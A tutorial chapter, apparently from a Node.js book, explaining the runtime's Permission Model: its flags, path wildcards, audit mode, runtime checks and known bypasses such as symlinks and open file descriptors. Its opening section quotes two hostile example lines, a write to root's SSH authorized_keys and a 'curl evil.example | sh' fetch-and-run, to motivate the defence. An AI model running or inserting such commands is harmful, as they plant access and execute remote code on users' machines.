---
chapter: 31
part: "Part IV — System Interfaces"
title: "The Permission Model"
level: advanced
reading_time: "32 min"
prerequisites: [22, 25, 28, 29]
source_docs:
  - "doc/api/permissions.md"
  - "doc/api/cli.md"
  - "doc/api/process.md"
  - "doc/api/errors.md"
source_url: "https://nodejs.org/docs/latest/api/permissions.html"
node_baseline: "27.0.0-pre"
---

# Chapter 31 — The Permission Model

## What you will learn

- Exactly what the Permission Model protects against — and the far larger set of things it does not.
- The current flag names, their individual stability levels, and which parts are still moving.
- Path semantics: wildcards, directories that do not exist yet, and the implicit entrypoint grant.
- How to discover what your application needs with audit mode before you enforce anything.
- Runtime checks with `process.permission.has()` and irreversible narrowing with `drop()`.
- Where this belongs relative to containers, seccomp, and AppArmor — and where it does not.

## Why this matters

Your application depends on 900 packages you did not write. Any one of them, at any version bump, can call `fs.writeFileSync('/root/.ssh/authorized_keys', ...)` or `child_process.exec('curl evil.example | sh')`. Nothing in Node's default configuration stops that. The runtime trusts every line of code it is asked to run, equally and completely.

The Permission Model narrows that. Start Node with `--permission` and the process cannot read files, write files, open sockets, spawn processes, create worker threads, load native addons, use WASI or FFI, or open the inspector — unless you explicitly grant each capability. A tool that should only read one config file and write one output directory can be confined to precisely that.

What it is not is a sandbox. The official framing is a **seat belt**: it stops *trusted* code from doing damage it did not mean to do. It is explicit that it "does not provide security guarantees in the presence of malicious code", and that "malicious code can bypass the permission model and execute arbitrary code without the restrictions imposed by the permission model". Getting that distinction right is the difference between a useful defence-in-depth layer and a false sense of security that gets someone fired. This chapter is written around it.

## Status and flag names — verified

The Permission Model itself is **Stability 2 - Stable**, promoted in v23.5.0 / v22.13.0. The enabling flag is `--permission`.

If you find tutorials using `--experimental-permission`, they predate stabilisation; that name does not appear anywhere in the current documentation. Use `--permission`.

Stability is not uniform across the surface, and the docs are specific about it:

| Flag / API | Added | Stability | Grants |
|---|---|---|---|
| `--permission` | v20.0.0 | 2 - Stable | Enables enforce mode |
| `--permission-audit` | v25.8.0 | (not separately labelled) | Enables audit mode |
| `--allow-fs-read=<path>` | v20.0.0 | Stable (v23.5.0 / v22.13.0) | File system reads |
| `--allow-fs-write=<path>` | v20.0.0 | Stable (v23.5.0 / v22.13.0) | File system writes |
| `--allow-child-process` | v20.0.0 | 1.1 - Active development | `child_process` |
| `--allow-worker` | v20.0.0 | 1.1 - Active development | `worker_threads` |
| `--allow-addons` | v21.6.0 / v20.12.0 | 1.1 - Active development | Native addons |
| `--allow-wasi` | v22.3.0 / v20.16.0 | 1.1 - Active development | WASI instances |
| `--allow-net` | v25.0.0 | 1.1 - Active development | Network access |
| `--allow-ffi` | v26.1.0 | 1.1 - Active development | `node:ffi` |
| `--allow-openssl-store` | v26.7.0 | 1.1 - Active development | OpenSSL STORE loaders |
| `--allow-inspector` | v25.0.0 / v24.12.0 | 1.0 - Early development | Inspector protocol |
| `process.permission.has()` | v20.0.0 | (with the model) | Runtime query |
| `process.permission.drop()` | v26.3.0 | 1.1 - Active Development | Runtime narrowing |

Two things follow. First, `--allow-net`, `--allow-ffi`, and `--allow-openssl-store` are recent and still at active-development stability — do not build a compliance story on their exact behaviour staying fixed. Second, only the two file-system flags share the model's Stable rating; the rest may change.

**Only `--allow-fs-read` and `--allow-fs-write` take a value.** Every other `--allow-*` flag is a boolean switch. There is no per-host network grant, no per-binary child-process grant, and no per-module addon grant. This matters for the worked example below, and it is the model's biggest current limitation.

## The threat model, stated plainly

### What it does protect against

- **A dependency that misbehaves by accident or by supply-chain compromise, using ordinary Node APIs.** A postinstall-style script or a transitive package calling `fs.writeFileSync` on a path outside your grants gets `ERR_ACCESS_DENIED`.
- **Your own code doing something unintended.** A path-traversal bug that resolves to `/etc/shadow` fails at the permission check rather than succeeding.
- **Capability creep.** A build tool that should never spawn a subprocess simply cannot, so a bug or an injected command has nowhere to go.

### What it does not protect against

- **Deliberate, targeted malicious code.** This is stated outright in the documentation. Treat the model as a seat belt, not a cage.
- **Anything reached other than through `node:fs`.** The docs name `node:sqlite` explicitly: file system restrictions apply to `fs`, and other paths to the disk are not guaranteed to be covered.
- **Existing file descriptors.** Using an already-open fd through `node:fs` bypasses the model entirely. So does a grant that has been dropped — `drop()` "does not close or revoke access to resources that are already open, such as file descriptors, network sockets, child processes, or worker threads."
- **Symbolic links out of the granted tree.** Symlinks are followed even when they point outside your allowed paths. Relative symlinks inside a granted directory can therefore reach arbitrary files. You must ensure granted paths contain no relative symlinks.
- **Flags that act before initialisation.** The model is initialised after the Node environment is set up, so `--env-file`, `--openssl-config`, and V8 flags set through `v8.setFlagsFromString` are not subject to it.
- **Cross-process inspector activation.** `process._debugProcess(pid)` sends an OS-level signal (SIGUSR1 on POSIX, a remote thread on Windows) and is **not gated by any permission scope**. A fully restricted process with no grants can force any other Node process running as the same OS user on the same host to open its V8 Inspector. The documented mitigation is operating-system isolation: separate OS users, or seccomp/AppArmor.
- **Worker threads.** The model does **not inherit into worker threads**. Granting `--allow-worker` is therefore a broad grant, not a narrow one.

That last set is why "not a sandbox" is the correct summary. What you get is a meaningful reduction in accidental blast radius, on the assumption that the code is trusted and the operating system is trusted.

## Turning it on

```bash
node --permission app.js
```

With no grants, this fails almost immediately:

```
Error: Access to this API has been restricted
    at node:internal/main/run_main_module:23:47 {
  code: 'ERR_ACCESS_DENIED',
  permission: 'FileSystemRead',
  resource: '/home/user/index.js'
}
```

The error object is the useful part. `code` is always `ERR_ACCESS_DENIED`; `permission` names the scope (`FileSystemRead`, `FileSystemWrite`, `ChildProcess`, `WorkerThreads`, `WASI`, `FFI`, and so on); `resource` names the path or host that was refused. Native addon loading is the exception — it throws `ERR_DLOPEN_DISABLED` instead, with the message "Cannot load native addon because loading addons is disabled."

### The implicit entrypoint grant

Your entry script and any `--require`/`-r` preload modules are added to the read allow-list automatically, so the process can at least load itself:

```bash
node --permission -r ./instrument.js server.js
```

Both `./instrument.js` and `server.js` are readable. Everything else, including `node_modules`, is not — which is why the very first thing most applications need is a read grant covering their dependency tree.

### Granting file system access

```bash
node --permission \
     --allow-fs-read=/srv/app \
     --allow-fs-write=/var/lib/app/data \
     server.js
```

Valid arguments are `*` (everything), absolute paths, and paths relative to the current working directory. **Repeat the flag for multiple paths** — comma-separated lists were removed in v20.7.0 and now produce a warning.

```bash
# Correct
--allow-fs-read=/etc/app --allow-fs-read=/srv/app

# Wrong: no longer supported
--allow-fs-read=/etc/app,/srv/app
```

### Path semantics and wildcards

Four rules, and the third one catches everybody:

1. **`*` matches a prefix.** `--allow-fs-read=/home/test*` grants `/home/test/file1` and `/home/test2` alike.
2. **Everything after a `*` is ignored.** `/home/*.js` behaves exactly like `/home/*`. There is no extension filtering — you cannot grant "only JavaScript files".
3. **An existing directory implicitly gets a trailing wildcard; a non-existent one does not.** If `/home/test/files` exists when the model initialises, it is treated as `/home/test/files/*`. If it does not exist, only the literal path `/home/test/files` is granted. To grant a directory that will be created later, write the wildcard yourself: `--allow-fs-write=/var/lib/app/cache/*`.
4. **Grants are checked against resolved paths, but symlinks are followed regardless of where they lead.** Rule 4 is a limitation, not a feature.

Rule 3 is the source of the classic "it works locally and fails in the container" bug: on your machine the output directory already exists, so the wildcard is added; in a fresh container it does not, so writes to files inside it are denied.

### Granting everything else

```bash
node --permission \
     --allow-fs-read=/srv/app \
     --allow-child-process \
     --allow-worker \
     --allow-net \
     --allow-addons \
     server.js
```

Remember these are all-or-nothing. `--allow-child-process` permits spawning *any* program; `--allow-net` permits connecting *anywhere*.

One inheritance behaviour worth knowing: as of v24.4.0 / v22.18.0, when a permission-model process spawns a child, the relevant flags propagate. `child_process.fork()` inherits them through the execution arguments, and `child_process.spawn()` through the `NODE_OPTIONS` environment variable. A permitted Node child therefore starts out restricted the same way its parent is — a genuinely good default.

### Configuration file

Permission flags can live in a Node configuration file under a `permission` top-level object, with the **[Experimental]** `--experimental-config-file` support:

```json
{
  "permission": {
    "allow-fs-read": ["./foo"],
    "allow-fs-write": ["./bar"],
    "allow-child-process": true,
    "allow-worker": true,
    "allow-net": true,
    "allow-addons": false,
    "allow-ffi": false,
    "allow-openssl-store": false
  }
}
```

When the `permission` namespace is present, Node enables `--permission` automatically. This is a much better place for a long grant list than a shell script — it is reviewable, diffable, and does not get truncated in a process listing.

### Under npx

`npx` needs read access to find and run the package, so the naive form fails with a `FileSystemRead` error. Pass flags through `--node-options`:

```bash
npx --node-options="--permission --allow-fs-read=$(npm prefix -g)" package-name
npx --node-options="--permission --allow-fs-read=$(npm config get cache)" package-name
```

The first grants the global `node_modules`; the second grants the npx cache.

## Audit mode: find out what you need first

Guessing a grant list by running the app and fixing one `ERR_ACCESS_DENIED` at a time is slow and finds only the paths your test run happens to exercise. Audit mode (`--permission-audit`, v25.8.0) does the whole discovery pass in one go: checks are performed and violations reported, but **nothing is denied** and execution continues normally.

```bash
node --permission-audit --require ./audit-report.js server.js
```

Violations are published to `node:diagnostics_channel`, one channel per scope:

| Channel | Scope |
|---|---|
| `node:permission-model:fs` | File system (read and write) |
| `node:permission-model:net` | Network |
| `node:permission-model:child` | Child process |
| `node:permission-model:worker` | Worker threads |
| `node:permission-model:inspector` | Inspector |
| `node:permission-model:wasi` | WASI |
| `node:permission-model:addon` | Native addons |
| `node:permission-model:ffi` | FFI |

Each message is an object with `permission` (the scope name) and `resource` (the path or host).

```mjs
// audit-report.js — collect everything the app would have been denied
import diagnostics_channel from 'node:diagnostics_channel';
import process from 'node:process';

const seen = new Map();

for (const name of [
  'node:permission-model:fs',
  'node:permission-model:net',
  'node:permission-model:child',
  'node:permission-model:worker',
  'node:permission-model:inspector',
  'node:permission-model:wasi',
  'node:permission-model:addon',
  'node:permission-model:ffi',
]) {
  diagnostics_channel.channel(name).subscribe(({ permission, resource }) => {
    const key = `${permission}\t${resource}`;
    seen.set(key, (seen.get(key) ?? 0) + 1);
  });
}

process.on('exit', () => {
  for (const [key, count] of [...seen].sort()) {
    console.error(`${count}\t${key}`);
  }
});
```

Run your full test suite under audit mode, aggregate the report, and you have a candidate grant list built from observed behaviour rather than guesswork. `--permission-audit` does not require `--permission`, and the `--allow-*` flags are unnecessary in audit mode since nothing is denied. You can also combine the two ideas — grant the flags you are confident about and audit the rest — but if you pass both `--permission` and `--permission-audit`, **`--permission` wins and the model enforces.**

## Runtime API

Enabling either flag adds `process.permission`.

### `process.permission.has(scope[, reference])`

```mjs
process.permission.has('fs.read');                       // ALL reads?
process.permission.has('fs.read', '/etc/myapp/config.json');
process.permission.has('fs.write', '/var/lib/app/data');
process.permission.has('child');
```

Without a reference the check is global — `has('fs.read')` asks whether *every* read is permitted, not whether any is. The documented scopes for `has()` are `fs`, `fs.read`, `fs.write`, `child`, `openssl.store`, `worker`, and `ffi`.

> **Doc note:** the `has()` scope list omits `net`, `inspector`, `wasi`, and `addon`, while the `drop()` list in the same document includes all four and states the scopes are the same. Treat the `drop()` list as the fuller one, and verify empirically on your Node version before relying on `has('net')`.

Use `has()` to fail fast and clearly at startup rather than deep inside a request:

```mjs
import process from 'node:process';

const CONFIG = '/etc/myapp/config.json';

if (process.permission && !process.permission.has('fs.read', CONFIG)) {
  console.error(`Missing --allow-fs-read=${CONFIG}`);
  process.exit(78);   // EX_CONFIG
}
```

The `process.permission &&` guard matters: the property does not exist when the model is off, so unguarded access throws in normal runs.

### `process.permission.drop(scope[, reference])`

**[Experimental]** (Stability 1.1, v26.3.0). Narrows permissions at runtime. **The operation is irreversible.**

This is the privilege-dropping pattern: take what you need at startup, then give it up before touching untrusted input.

```mjs
import fs from 'node:fs';
import process from 'node:process';

// Startup: read secrets and configuration while we still can.
const config = JSON.parse(fs.readFileSync('/etc/myapp/config.json', 'utf8'));
const key = fs.readFileSync('/etc/myapp/tls.key');

// Then give up the capability entirely.
process.permission.drop('fs.read', '/etc/myapp');
process.permission.drop('child');

process.permission.has('fs.read', '/etc/myapp/config.json'); // false
fs.readFileSync('/etc/myapp/config.json');                   // ERR_ACCESS_DENIED
```

Three rules govern what you can drop:

1. **The reference must match the original grant exactly.** If you granted `--allow-fs-read=/my/folder`, you cannot drop one file inside it — you must drop `/my/folder`.
2. **A wildcard grant can only be dropped wholesale.** After `--allow-fs-read=*`, individual paths cannot be dropped; only `drop('fs.read')` with no reference works.
3. **Dropping affects future checks only.** Already-open file descriptors, sockets, child processes, and worker threads keep working. Closing them is your responsibility.

In audit mode, `drop()` still takes effect on `has()` results, but since nothing is denied the practical impact is limited to the return value.

## A worked example: locking down a config-reading, network-calling script

Here is the task from the brief: a script that should read exactly one config file and talk to exactly one host.

```mjs
// fetch-metrics.mjs
import { readFile } from 'node:fs/promises';
import { writeFile } from 'node:fs/promises';
import process from 'node:process';

const CONFIG = '/etc/metrics-agent/config.json';
const OUT = '/var/lib/metrics-agent/latest.json';

if (process.permission) {
  for (const [scope, ref] of [['fs.read', CONFIG], ['fs.write', OUT]]) {
    if (!process.permission.has(scope, ref)) {
      console.error(`missing grant: ${scope} on ${ref}`);
      process.exit(78);
    }
  }
}

const { endpoint, token } = JSON.parse(await readFile(CONFIG, 'utf8'));

// Read the config once, then drop read access to the secret directory.
process.permission?.drop('fs.read', '/etc/metrics-agent');

const res = await fetch(endpoint, { headers: { authorization: `Bearer ${token}` } });
if (!res.ok) throw new Error(`upstream ${res.status}`);

await writeFile(OUT, JSON.stringify(await res.json()));
```

Run it:

```bash
node --permission \
     --allow-fs-read=/etc/metrics-agent/config.json \
     --allow-fs-write=/var/lib/metrics-agent/latest.json \
     --allow-net \
     fetch-metrics.mjs
```

What that buys you: no subprocess can be spawned, no worker thread created, no native addon or WASI module loaded, no inspector opened, and the file system is narrowed to one readable file and one writable file. If a transitive dependency tries to read `~/.aws/credentials`, it gets `ERR_ACCESS_DENIED`. After the `drop()`, even *this* script cannot re-read the token file.

**Now the honest part: "talk to one host" is not expressible.** `--allow-net` is a boolean. Once granted, the process may connect anywhere. If restricting the destination is a real requirement — and for an agent handling a bearer token it usually is — you must enforce it outside Node:

- Network policy in your orchestrator (Kubernetes `NetworkPolicy`, a security group, a firewall rule).
- An egress proxy with an allow-list, with `HTTPS_PROXY` set and direct egress blocked.
- A per-process network namespace.

Two smaller notes on this example. `--allow-fs-write=/var/lib/metrics-agent/latest.json` grants the literal path; if you later write sibling files, or the file does not exist and you expected directory semantics, add the wildcard form `/var/lib/metrics-agent/*` deliberately. And because the entrypoint gets an implicit read grant, `fetch-metrics.mjs` itself is readable without being listed — but any module it imports from `node_modules` is not, so a real deployment needs a read grant covering the dependency tree.

## What breaks when you turn it on

Expect friction. In rough order of how often it bites:

| Symptom | Cause | Fix |
|---|---|---|
| `ERR_ACCESS_DENIED` on `FileSystemRead` for a package path | Only the entrypoint is granted; `node_modules` is not | `--allow-fs-read=/srv/app` covering the whole install |
| `ERR_DLOPEN_DISABLED` | A dependency ships a native addon (`bcrypt`, `sharp`, `better-sqlite3`, database drivers) | `--allow-addons`, or switch to a pure-JS alternative |
| `ERR_ACCESS_DENIED` on `ChildProcess` | A library shells out — image tooling, git wrappers, some test runners | `--allow-child-process`, or drop the dependency |
| `ERR_ACCESS_DENIED` on `WorkerThreads` | Pools inside build tools, bundlers, some parsers | `--allow-worker` |
| Writes to a temp directory fail | The directory did not exist at init, so no implicit wildcard | Grant `/tmp/myapp/*` explicitly |
| A logger cannot rotate files | Rotation creates new filenames | Grant the directory with a wildcard, not the current file |
| SQLite extension loading fails | Run-time loadable extensions are blocked under the model | Do not rely on loadable extensions |
| OpenSSL engine requests fail at runtime | Engines cannot be requested at runtime under the model | Configure crypto without engines |

Adjacent gotchas: `--env-file` reads before the model initialises, so it is not restricted (convenient, and also a hole to be aware of); and worker threads do not inherit the model, so `--allow-worker` widens more than it looks like it does.

The practical adoption sequence is: run the test suite under `--permission-audit`, aggregate the diagnostics-channel report, write the grant list, enable `--permission` in a staging environment, and only then in production. Doing it the other way round means discovering your grant list from customer-facing incidents.

## Where it belongs relative to OS sandboxing

The Permission Model is one layer, and a shallow one. It sits inside your process and is enforced by the runtime it is protecting you from.

| Layer | Enforced by | Stops | Blind to |
|---|---|---|---|
| Permission Model | Node itself | Accidental `fs`/`child_process`/`net`/addon use by trusted code | Anything not routed through Node's APIs; deliberate bypass |
| Container / namespaces | Kernel | Access to files and processes outside the container | Everything inside the container image |
| seccomp-bpf | Kernel | Whole classes of syscalls (`execve`, `ptrace`, raw sockets) | Permitted syscalls used maliciously |
| AppArmor / SELinux | Kernel LSM | Per-binary file, capability, and network rules | Logic bugs within the allowed policy |
| Network policy / egress proxy | Network stack | Where the process can connect — the granularity `--allow-net` lacks | On-host activity |
| Separate OS user | Kernel | Cross-process signalling, including the `_debugProcess()` path | Anything the user is allowed to do |

The layers compose, and the Permission Model is best understood as the cheapest and least powerful of them. It costs one flag and no infrastructure. It is the only one of them that a developer can turn on without talking to anyone. Use it — and do not let it substitute for a container with a read-only root filesystem, a non-root user, dropped capabilities, and a network policy.

The documentation makes exactly this point in the `_debugProcess()` section: cross-process signalling is an OS capability, and restricting it is the operator's job through process isolation, separate OS users, or seccomp/AppArmor profiles.

## Common mistakes

### ❌ Treating it as a sandbox for untrusted code

```bash
# "This will safely run the plugin our users uploaded."
node --permission --allow-fs-read=/srv/plugins run-plugin.js
```

It will not. The docs state that malicious code can bypass the model and execute arbitrary code. Untrusted code needs process isolation, a container, a VM, or a purpose-built runtime.

✅ Use the model as one layer inside a real boundary:

```bash
docker run --read-only --cap-drop=ALL --user 10001 --network=none \
  myimage node --permission --allow-fs-read=/srv/plugins run-plugin.js
```

### ❌ Granting a directory that does not exist yet

```bash
node --permission --allow-fs-write=/var/cache/myapp app.js
# ERR_ACCESS_DENIED when the app writes /var/cache/myapp/session-1
```

The implicit wildcard is only added when the directory already exists at initialisation.

✅ Write the wildcard explicitly:

```bash
node --permission --allow-fs-write=/var/cache/myapp/* app.js
```

### ❌ Expecting an extension filter from a wildcard

```bash
--allow-fs-read=/srv/app/*.json
```

Everything after `*` is ignored, so this grants `/srv/app/*` — every file in the tree, of every type.

✅ List the files you actually need, or accept that the grant is directory-wide and narrow it another way:

```bash
--allow-fs-read=/srv/app/config.json --allow-fs-read=/srv/app/schema.json
```

### ❌ Using `process.permission` unguarded

```mjs
if (!process.permission.has('fs.read', p)) throw new Error('no access');
// TypeError when the model is off
```

`process.permission` only exists under `--permission` or `--permission-audit`.

✅ Guard it, and treat "model off" as "allowed":

```mjs
if (process.permission && !process.permission.has('fs.read', p)) { /* ... */ }
```

### ❌ Assuming `drop()` closes what is already open

```mjs
const fd = fs.openSync('/etc/secrets/key', 'r');
process.permission.drop('fs.read', '/etc/secrets');
fs.readSync(fd, buf, 0, 32, 0);   // still works
```

Dropping affects future access checks only, and using an existing fd through `node:fs` bypasses the model in any case.

✅ Close the resource, then drop:

```mjs
const key = fs.readFileSync('/etc/secrets/key');
process.permission.drop('fs.read', '/etc/secrets');
```

## Production notes

- **Adopt through audit mode.** Run your full test suite under `--permission-audit` with a diagnostics-channel subscriber, aggregate the results, and derive the grant list from observed behaviour. Enabling enforcement first means discovering your requirements from production incidents.
- **Keep grants in a config file, not a command line.** The `permission` namespace in a Node configuration file is reviewable in code review, diffable across deploys, and does not get mangled by shell quoting or truncated in `ps` output.
- **Audit every wildcard in review.** `--allow-fs-read=*` and `--allow-fs-write=*` disable the feature for that scope while looking like configuration. Treat them the way you treat `chmod 777`.
- **Verify there are no relative symlinks in granted paths.** Symlinks are followed out of the allowed tree, so one relative link inside a granted directory can expose the whole file system. Check at deploy time, not once at design time.
- **Pin your Node version against the moving flags.** `--allow-net`, `--allow-ffi`, and `--allow-openssl-store` are at Stability 1.1, and `--allow-inspector` at 1.0. Behaviour can change in a minor release. Regression-test your permission configuration on every Node upgrade.
- **Do not rely on it for network restriction.** `--allow-net` is all-or-nothing. Destination control belongs in a network policy, a firewall, or an egress proxy.
- **Remember `--allow-worker` is broad.** The model does not inherit into worker threads, so a granted worker is unrestricted. If you use workers, the sandbox story ends at the thread boundary.
- **Combine with OS-level isolation, always.** A read-only root filesystem, a non-root user, dropped capabilities, and a seccomp profile do more than the Permission Model can. Run both. And run mutually distrusting processes under different OS users, because `process._debugProcess()` is not gated by any scope.
- **Production readiness, honestly.** The model and the two file-system flags are Stable and ready to use as a defence-in-depth layer for code you already trust. The rest of the surface is not settled, and none of it is a substitute for a sandbox. Ship it as one control among several, with the exact Node version pinned.

## Exercises

1. **Discover your grant list.** Run an existing project's test suite under `--permission-audit` with a subscriber on all eight channels. *Success:* a deduplicated, sorted report of scope/resource pairs, and a `--permission` command line derived from it that runs the suite green.

2. **Map the path semantics.** Empirically determine what `--allow-fs-read` grants for: an existing directory, a non-existent directory, a directory with an explicit `/*`, `/tmp/a*`, and `/tmp/*.txt`. *Success:* a table of granted and denied paths for each, with `process.permission.has()` output as evidence.

3. **Demonstrate the symlink limitation.** Create a granted directory containing a relative symlink that escapes it, and read a file outside the grant through that link. *Success:* a working reproduction, and a deploy-time check script that detects escaping symlinks in a granted tree.

4. **Implement privilege dropping.** Take a service that reads TLS keys and a config file at startup, then drops `fs.read` on the secret directory and `child` entirely before binding its listener. *Success:* the service works normally, and a deliberately injected `readFileSync` of the key later in the request path fails with `ERR_ACCESS_DENIED`.

5. **Layer the defences.** Package the metrics agent from this chapter as a container with a non-root user, a read-only root filesystem, dropped capabilities, a network policy allowing exactly one destination, and the Permission Model enabled. *Success:* a written table of which of five attacks (arbitrary file read, arbitrary file write, subprocess spawn, exfiltration to an unapproved host, inspector activation on another process) is stopped by which layer — including the one that only the OS layer stops.

## Recap

- The Permission Model is **Stable** as of v23.5.0 / v22.13.0, enabled with `--permission`. The older `--experimental-permission` name is gone from the docs.
- It is a **seat belt for trusted code**, not a sandbox. The documentation states plainly that malicious code can bypass it.
- Enabling it restricts file system, network, child processes, worker threads, native addons, WASI, FFI, OpenSSL STORE loaders, and the inspector.
- Only `--allow-fs-read` and `--allow-fs-write` take path arguments; every other `--allow-*` flag is boolean. There is no per-host network grant.
- The entrypoint and `--require` preloads get an implicit read grant. Repeat flags for multiple paths; comma-separated lists are no longer supported.
- `*` matches a prefix and swallows everything after it; existing directories get an implicit trailing wildcard, non-existent ones do not.
- `--permission-audit` reports violations through eight `node:permission-model:*` diagnostics channels without denying anything — use it to build your grant list. `--permission` wins if both are set.
- `process.permission.has(scope[, ref])` queries at runtime; `process.permission.drop()` **[Experimental]** narrows irreversibly and affects only future checks.
- Known holes: symlinks escape granted trees, existing fds bypass checks, `--env-file` runs before initialisation, workers do not inherit the model, and `process._debugProcess()` is not gated at all.
- Layer it with containers, non-root users, seccomp/AppArmor, and network policy. It complements those controls; it does not replace any of them.

## Where to go next

- [Chapter 28 — Child Processes](../part4-system/28-child-processes.md) for what `--allow-child-process` gates.
- [Chapter 29 — Worker Threads](../part4-system/29-worker-threads.md) for why `--allow-worker` is broader than it looks.
- [Chapter 22 — File System I: Reading, Writing, and Metadata](../part4-system/22-filesystem-basics.md) for the `fs` surface the model restricts.
- [Chapter 48 — Diagnostics Channel and Trace Events](../part7-diagnostics/48-diagnostics-channel-tracing.md) for the channel API audit mode publishes on.
- [Chapter 44 — Securing Node.js Applications](../part6-security/44-securing-applications.md) for the wider threat model and supply-chain defences.
- [Chapter 52 — The `vm` Module and Code Isolation](../part8-advanced/52-vm-sandboxing.md) for why `vm` is not a sandbox either.
- [Chapter 60 — Deployment, Containers, and Configuration](../part9-production/60-deployment-and-config.md) for the OS-level layers this one sits inside.
- Official documentation: <https://nodejs.org/docs/latest/api/permissions.html>
